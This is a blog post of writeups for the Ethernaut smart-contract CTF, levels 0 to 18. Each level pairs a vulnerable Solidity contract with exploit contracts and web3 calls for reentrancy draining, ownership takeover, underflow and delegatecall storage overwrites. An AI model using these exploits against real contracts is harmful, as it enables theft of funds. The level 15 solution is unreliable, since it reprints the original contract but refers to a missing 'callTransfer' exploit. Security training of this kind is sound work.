---
title: Ethernaut CTF writeups
layout: post
date: 2022-06-23
headerImage: false
tag:
- ethereum
- ctf
- writeups
- security
- solidity
category: blog
author: sh15h4nk
description: Writeups for ethernaut ctf.
---

# Intro
H3y th3r3!, here are my writeups for the [Ethernaut](https://ethernaut.openzeppelin.com/) CTF. The CTF was very fun specially the last few challenges are very realistic. Working through them gave me a good taste of how vulns and bugs can be exploited. I recommend everyone to solve these challenges.

# Solutions
## 0 Hello Ethernaut
This challenge aims to setup the environment and get started to interact with the contract via provided web3 object (TruffleContract - contract).  In order to complete this challenge, we have to interact with the contract.
*note:  the source code of the contract is not provided.*


> #### Solution:
> We could interact with the contract by using the TruffleContract object provided.
> 
> ```js
> await contract.info();
> await contract.info1();
> await contract.info2("hello");
> await contract.infoNum();
> await contract.info42();
> await contract.theMethodName();
> await contract.method7123949();
> await contract.authenticate(await contract.password());
> ```
> By submitting the instance level will be completed.

#### Source: 
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}
```

However we could look at the ABI of the contract with the provided TruffleContract object with `contract.abi`
<hr>

## 1 Fallback

We need to claim the ownership of the contract and withdraw its funds to complete this level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

> #### Solution: 
> A flaw in this contract is that, it's fallback function is directly assigning the owner with weak  authentication. 
>  - In order to become the owner we need to make a contribution to the contract by calling the `contribute()` function to pass the checks in the fallback function.
> 
>  - Then we have to call the fallback function to become the owner of the contract.
>  - We can then simply call the `withdraw()` function to withdraw all the funds of the contract, which eventually reduces the contract's balance to 0.
> 
> ```sol
> //to make a contribution
> await web3.eth.sendTransaction({
>     from: player,
>     to: instance,
>     value: web3.utils.toWei("0.0001"),
>     data: web3.eth.abi.encodeFunctionSignature("contribute()")
> });
> 
> //calling fallback function
> await web3.eth.sendTransaction({
>     from: player,
>     to: instance,
>     value: web3.utils.toWei("0.0001")
> });
> 
> //calling withdraw function
> await contract.withdraw();
> ```

<hr>

## 2 Fallout
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

The flaw in this contract is that the constructor name is misspelled so the solidity considers it a function rather than constructor. Now we can simply call the function `Fal1out()` to become the owner of the contract.

> #### Solution:
> ```js
> await contract.Fal1out(); //misspelled constructor
> ```
<hr>

## 3 Coin Flip
We have to make 10 consecutive wins in the flip game to complete this level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
Using blockhash and block number for generating random value is considered insecure in solidity, as these values can be calculated as the blockhash will be same for the transactions included in the same block.

> #### Solution:
> We will calculate the `side` with our exploit contract and call the `flip(bool _guess)` function of the contract to win the game. We have to do this 10 times in order to complete this level.
> 
> - We will initialize our exploit contract with the instance of our contract.
> - Then we will call the `calculateFlip()` function 10 times to win the game.
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface game {
>   function flip(bool _guess) external returns (bool);
> }
> 
> contract exp {
>   uint256 lastHash;
>   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
>   game cF;
> 
>   constructor(address instance){
>     cF = game(instance);
>   }
> 
>   function calculateFlip() public {
>     uint256 blockValue = uint256(blockhash(block.number -  1 ));
>     require(lastHash != blockValue);
> 
>     lastHash = blockValue;
>     uint256 flip = blockValue / FACTOR;
>     bool guess = flip == 1 ? true : false;
> 
>     require(cF.flip(guess));
>   }
> }
> ```

<hr>

## 4 Telephone
We have to claim the ownership of this contract to finish this level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

We have a check in the `changeOnwer` function, we need to pass that check inorder to set the owner. When we call the `changeOwner` function from an other contract we could sucessfully pass the check and write the owner. Because `tx.origin` contains the EOA from where the transaction was initiated and `msg.sender` will be our exploit contract.

> #### Solution:
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface telephone {
>     function changeOwner(address _owner) external;
> }
> 
> contract telephoneExploit {
>     telephone tP;
> 
>     constructor(address _instance){
>         tP = telephone(_instance);
>     }
> 
>     function messageCall(address _player) public {
>         tP.changeOwner(_player);
>     }
> }
> ```

<hr>

## 5 Token
In this challenge, we're given 20 tokens, inorder to complete this level we have to steal tokens from the contract.
#### Source: 
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

This contract has an integer underflow bug in the `transfer` function, which can be used to maliciously change the values of integer, we will use this bug to increase our balance. The `uint` in solidity is `uint256` so it can hold upto 2\*\*256 - 1, when we add 1 to it. It will be overflowed and will become 0. The same way when we subtract 0 - 1 it will become 2\*\*256 - 1 since it is `uint256`. So now we can pass a value `21` to the `transfer` function which does `balances[msg.sender] - value` => 20 - 21 this will become 2\*\*256 -1. As a result our balance will become huge.

> #### Solution:
> ```js
> await contract.transfer(instance, 21);
> ```

<hr>

## 6 Delegation
We have to claim the ownership of the given contract instance to complete the level.

#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```
	
We can see that `fallback()` function in the contract makes a delegate call to other contract, in a delegate call the same msg.sender, msg.value and the storage will be used while the execution of the code.

Solidity allocates slots for the variables in the order as they appear, since the same storage is used in the delegate call if we try to update the slot 0 (owner) in the `Delegate` contract, underhoods it updates the slot 0 (owner) of the `Delegation` contract. As the storage of Delegation contract will be used.

> #### Solution:
> We have to call the `pwn()` function from the Delegation contract to update the owner.
> ```sol
> await sendTransaction({
>     from: player,
>     to: instance,
>     data: web3.eth.abi.encodeFunctionSignature("pwn()")
> });
> ```

<hr>

## 7 Force
We need to deposit funds to this contract to complete this level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

There are no functions that we could use to send funds to this contract. One way to send funds to this contract is via `selfdestruct`. We can have an exploit contract which will get self destructed and all the funds in exploit can be sent to any address specified.

#### Solution:
- First we deploy our expolit contract.
- Then we transfer some funds to our exploit.
- Then we call the `selfDestruct` function with our contract instance address as a parameter, that will sucessfully send funds to our contract.



```sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract forceExploit {
    
    function selfDestruct(address payable _address) payable public {
        selfdestruct(_address);
    }

    receive() external payable {
    }

}
```

<hr>

## 8 Vault
We have to unlock the vault to complete this level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Here we have two variables, as the solidity stores them in the order they appear, so `locked` will be stored in slot0 and `password` will be stored in the slot1. Even though the `password` is a private variable still we can read the data. Since anyone can view the storage of a smart contract with `web3.eth.getStorageAt` function, thats why its is significant to encrypt the sensitive data before storing in the blockchain although it is not recommended.

> #### Solution:
> The vault will be unlocked when we call `unlock` function with correct password. we can read the password with `web3.eth.getStorageAt` function and pass on the value to the function, as a result the vault will be unlocked.
> 
> ```js
> await contract.unlock(await web3.eth.getStorageAt(instance, 1)) 
> ```


<hr>

## 9 King
This contract is a game, which maintains a king and anyone can become king by sending ether greater than or equal to price. We need to stop someone becoming the king to break this game.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

When someone sends ether to the contract, it check if the value is greater than or equal to the prize or the sender is the owner. If so the value amount will be transfered to the king and msg.sender will become the new king. The transfer can potentially break the code if we can `revert()` when transfering value that will block others to become the king.

> ### Solution:
> - We deploy our exploit contract with 0.01 ether.
> - And when recieving ether we have our custom `fallback()` function which will `revert()` the transaction.
> - Once our exploit become the king it will block the others from becoming the new king as a result we will be king forever.
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> contract kingExploit {
> 
>     constructor(address payable instance) public payable {
>         require(msg.value >= 0.01 ether);
>         instance.call{value : 0.01 ether}("");
>     }
> 
>     fallback () external payable{
>         revert();
>     }
> }
> ```

<hr>

## 10 Re-entrancy
We need to steal all the funds from the contract to complete this level.

#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

This is a well known bug in the space which had a huge impact on the ethereum blockchain (The DAO attack).  We need to drain out the funds from the contract. 
Here the contract makes a call to other contract which can then be used to call the same function, since the balance is updated after the call we would potentially steal all the funds from the contract. 


> #### Solution:
> - After deploying our exploit contract, we have to make a donation to the contract to add balance of our exploit contract.
> 
> ```js
> await sendTransaction({
>     from: player,
>     to: instance,
>     value: web3.utils.toWei("0.001"),
>     data: web3.eth.abi.encodeFunctionSignature("donate(address)") + web3.eth.abi.encodeParameter("address", exploit).substring(2)
> });
> ```
> 
> - There are we need to simply call the `callWithdraw()` function.
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface reenter {
>     function withdraw(uint _amount) external;
> }
> 
> contract reentranceExploit {
>     reenter re;
> 
>     constructor(address instance) payable {
>         re = reenter(instance);
>     }
> 
>     function callWithdraw() payable public {
>         re.withdraw(0.001 ether);
>     }
> 
>     fallback() external payable {
>         re.withdraw(0.001 ether);
>     }
> }
> 
> ```


<hr>

## 11 Elevator
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

To complete this level we have to return different values from a function to bypass the checks, first to we have to return `false` to pass the check `! building.isLastFloor(_floor)`, there after we have to return `true` to make the variable `top` to `true`.

> #### Solution:
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface ele {
>     function goTo(uint _floor) external;
> }
> 
> contract elevator {
>     ele e;
>     uint count;
> 
>     constructor(address _instance){
>         e = ele(_instance);
>     }
> 
>     function isLastFloor(uint _floor) public returns (bool){
>         if (count == 0){
>             count++;
>             return false;
>         }
>         return true;
>     }
> 
>     function callGoto() public{
>         uint _floor = 1;
>         e.goTo(_floor);
>     } 
> }
> ```

<hr>


## 12 Privacy
We need to unlock the contract to complete this level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

To unlock the contract we need to call the `unlock` function with `key`.  This challenge is a bit similar to `Valut` challenge. As we can see that the data array is stored in the storage and we can read the storage. But before that we have understand how the storage actually works, I found [this](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) blog which explains that in a good brief.
So the 3rd element of the bytes array will be stored at 5th slot since the array will be stored in the reverse order. We submit the key from our exploit.

> #### Solution:
> - We need to obtain the data stored at the 5th slot.
> 
> ```js
> await web3.eth.getStorageAt(instance,5);
> /* "0x81391acc1432a12ec8ae3c2524fc5501964e0bb757ec15f6587ecce3d61084c8" */
> ```
> - We submit the key using our exploit contract.
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface privacy {
>     function unlock(bytes16 _key) external;
> }
> 
> contract privacyExp {
>     bytes32 data = 0x81391acc1432a12ec8ae3c2524fc5501964e0bb757ec15f6587ecce3d61084c8;
>     privacy priv;
> 
>     constructor(address _instance) {
>         priv = privacy(_instance);
>     }
> 
>     function submitKey() public {
>         priv.unlock(bytes16(data));
>     }
> }
> ```

<hr>

## 13 Gatekeeper One
We need to pass all the checks of the modifiers (`gateOne`, `gateTwo` and `gateThree`) to finish the level.

### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```


- The first `gateOne` is similar to `Telephone` challenge, we need to call the contract from another contract instead of EOA.
- The second `gateTwo` will check the amount of  gasLeft at the time operation is divisible by `8191`, we can call the contract by specifying gas so this can be brute forced.
- The Last one consists of three checks,

`require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");`
The `uint32` takes the lower 32 bits, and `uint16` takes the lower 16 bits, so in order to pass the check we need to set the bits 16 - 31 to `0`.

`require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");`
Here the higher 32 bits of `uint64` should not be equal to `0` since both these parameters shouldn't be equal.

`require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");`
And finally the lower 16 bits must be equal to lower 16 bits of the `tx.origin`.

> #### Solution:
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.6.0;
> 
> contract gateOneExp {
>     constructor(address _instance) public {
>         uint64 key = 0;
>         key = key ^ uint16(tx.origin);
>         key = key ^ (1 << 32);
>         for(uint i = 0; i < 8191; i++ ){
>             (bool result, ) = _instance.call{gas: 300000 + i}(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
>             if (result){
>                 break;
>             }
>         }
>     }
> }
> ```

<hr>

## 14 Gatekeeper Two
We need to pass all the checks of the modifiers (`gateOne`, `gateTwo` and `gateThree`) to finish the level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

- The `gateOne` is same as the gate one in the before challenge.
- And `gateTwo` checks that the size of the code at caller address is zero, when we call the contract from another this checks fails, we can bypass this check by calling the contract from the constructor of the other contract where the size of code will be `0` because the code gets allocated only after successful execution of constructor.
- Finally, the `gateThree` we can decypher the key by doing an `xor` operation between `uint64(bytes8(keccak256(abi.encodePacked(this))))` and `(uint64(0) - 1)`.

> #### Solution:
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.6.0;
> 
> interface gate {
>     function enter(bytes8 _gateKey) external returns (bool);
> }
> 
> contract gateTwoExp {
>     gate g;
> 
>     constructor(address _instance) public{
>         g = gate(_instance);
>         bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
>         g.enter(key);
>     }
> }
> ```

<hr>

## 15 Naught Coin
We need to transfer our token balance to other address.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

We have to transfer our token balance to other address but we are not allowed to transfer until 10 years are passed due to `lockTokens` modifier.

The `Naught Coin` inherts `ERC20` standards, In `ERC20` standards we can add `allowance` and `approve` other addresses to spend our tokens using  `transferFrom`.
We could make use of this functionality to transfer our tokens.

> #### Solution:
> - Deploy the exploit contract, then we need to approve our exploit contract to transfer the tokens, the INITIAL_SUPPLY of tokens was `1000000000000000000000000`, so we have to approve that many tokens.
> 
> ```js
> await contract.approve("0x6159cd67e0ed54ec7c5c90c183fdc8f681032139", value) 
> /* replace 0x6159cd67e0ed54ec7c5c90c183fdc8f681032139 with exploit instance */
> ```
> - Then we have to call the `callTransfer` function of our exploit contract to transfer the tokens.
> 
> 
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
> 
>  contract NaughtCoin is ERC20 {
> 
>   // string public constant name = 'NaughtCoin';
>   // string public constant symbol = '0x0';
>   // uint public constant decimals = 18;
>   uint public timeLock = now + 10 * 365 days;
>   uint256 public INITIAL_SUPPLY;
>   address public player;
> 
>   constructor(address _player) 
>   ERC20('NaughtCoin', '0x0')
>   public {
>     player = _player;
>     INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
>     // _totalSupply = INITIAL_SUPPLY;
>     // _balances[player] = INITIAL_SUPPLY;
>     _mint(player, INITIAL_SUPPLY);
>     emit Transfer(address(0), player, INITIAL_SUPPLY);
>   }
>   
>   function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
>     super.transfer(_to, _value);
>   }
> 
>   // Prevent the initial owner from transferring tokens until the timelock has passed
>   modifier lockTokens() {
>     if (msg.sender == player) {
>       require(now > timeLock);
>       _;
>     } else {
>      _;
>     }
>   } 
> }
> ```
<hr>

## 16 Preservation
We need to claim the ownership of the contract to complete the challenge.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

This contract is using `delegatecall` to set the time, we can use this functionality to maliciously update the storage of the contract.

> #### Solution:
> - First we need to call the `setFirstTime` to set the slot 0 of the storage to our exploit contract address.
> 
> ```js
> await contract.setFirstTime("0xfcd4dc8e8aab4aad401ac4198af72aa3f172e6b5")
> /* replace 0xfcd4dc8e8aab4aad401ac4198af72aa3f172e6b5 with exploit contract address*/
> ```
> - Then after updating the slot 0 of the storage we can delegatecall to our exploit contract where we can update the slot 3 of the storage. Again,
> 
> ```js
> await contract.setFirstTime(player);
> /* Here the player has no significance you can pass any values you want*/
> ```
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> contract preservationExp {
>     address public timeZone1Library;
>     address public timeZone2Library;  
>     address public owner;
>     
>     function setTime(uint _time) public {
>         owner = address(0xC009215b0c94debc7656502B015DFB9E51529A2D);
>     }
> }
> 
> ```
<hr>

## 17 Recovery
We need to recover the `0.001` ether sent to the lost contract.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```
The `SimpleToken` contract is is deployed from `generateToken` function from the `Recovery` contract, we need to call the `destroy` function of the deployed instance of `SimpleToken` in order to recover the ether.
We can calculate the address of the deployed instance, [this](https://ethereum.stackexchange.com/questions/9776/generate-contract-address-using-nonce) blog describes how to calculate the address.
Alternatively we can also find the address of the instance by looking at the [EtherScan](https://rinkeby.etherscan.io/) of the transaction to get a new instance, but this method of finding is not recommended although we get the address.

> #### Solution:
> - Find the address of the deployed contract instance, then run the exploit.
> 
> 
> ```sol
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.0;
> 
> interface simpleToken {
>     function destroy(address payable _to) external;
> }
> 
> contract simpleExp{
>     simpleToken sT;
> 
>     constructor(address _instance) public {
>         sT = simpleToken(_instance);
>         address payable _to = payable(address(tx.origin));
>         sT.destroy(_to);
>     }
> }
> ```

<hr>

## 18 MagicNumber
We need to set a Solver contract to finish the level.
#### Source:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
 
}
```
In this challenge we have to set a `Solver` contract, which needs to return the magic number `42` on call to the `whatIsTheMeaningOfLife` function, but here the catch is that the code needs to really really small like literally at most 10 opcodes. So for that we have to write the opcode on our own. All the opcodes are [here](https://github.com/wolflo/evm-opcodes).

> #### Solution:
> - Opcode which returns the magic number.
> 
> ```asm
> PUSH1 0X2a	// pushing the number onto stack
> PUSH1 0X0	 // offset 
> MSTORE		// stores the data at the given offset 
> PUSH1 0X20	// pushing the length onto stack
> PUSH1 0X0 	// offset
> RETURN		// returns the data of given length at given offset
> ```
> - We are also required to write the code for constructor since it will copy the code to the address.
> 
> ```asm
> PUSH1 0x0a
> DUP1
> PUSH1 0x0c
> PUSH1 0x00
> CODECOPY
> PUSH1 0x0
> RETURN
> STOP
> PUSH1 0X2a	// pushing the number onto stack
> PUSH1 0X0	 // offset 
> MSTORE		// stores the data at the given offset 
> PUSH1 0X20	// pushing the length onto stack
> PUSH1 0X0 	// offset
> RETURN		// returns the data of given length at given offset
> ```
> - Resulting bytecode.
> 
> ```asm
> 600a80600c6000396000f300602a60005260206000f3
> ```
> - Now we need to send a transaction to zero address to create a new contract with this data.
> 
> ```js
> solver = await web3.eth.sendTransaction({
>     from: player,
>     to: null,
>     data: "0x600a80600c6000396000f300602a60005260206000f3"
> })
> ```
> - Set the solver address.
> 
> ```js
> await contract.setSolver(solver.contractAddress);
> ```

<hr>

